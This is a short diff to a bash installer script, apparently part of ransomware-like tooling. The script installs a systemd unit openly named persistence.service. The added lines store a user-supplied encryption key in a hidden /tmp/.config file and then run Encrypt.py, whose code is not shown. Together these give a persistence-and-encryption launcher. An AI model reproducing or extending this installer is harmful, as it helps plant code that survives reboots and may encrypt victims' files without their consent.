@@ -1,5 +1,14 @@
 #!/bin/bash
 
+# Ask for the encryption key
+read -p "Enter the encryption key: " encryption_key
+
+# Check if /tmp/.config exists, if not, create it
+[ ! -d "/tmp/.config" ] && mkdir -p "/tmp/.config"
+
+# Save the key
+echo $encryption_key > /tmp/.config/key
+
 # Path where the Python script will be copied
 TARGET_DIR="/usr/local/bin"
 
@@ -37,3 +46,7 @@ systemctl enable persistence.service
 systemctl start persistence.service
 
 echo "Persistence service installed and started."
+
+# Execute Encrypt.py
+echo "Executing Encrypt.py..."
+python3 Encrypt.py
